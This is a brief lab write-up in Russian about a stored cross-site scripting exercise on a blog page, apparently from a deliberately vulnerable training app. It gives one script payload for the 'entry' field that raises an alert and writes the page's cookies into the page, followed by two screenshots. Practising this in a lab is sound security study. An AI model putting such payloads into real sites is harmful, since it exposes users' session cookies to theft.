---
title: Cross-Site Scripting - Stored (Blog)
---

# Cross-Site Scripting - Stored (Blog)

В поле entry вставляем payload 
```bash
<script>alert("daniil");document.write(document.cookie)</script>
```
![](images/img_18.png)

![](images/img_19.png)
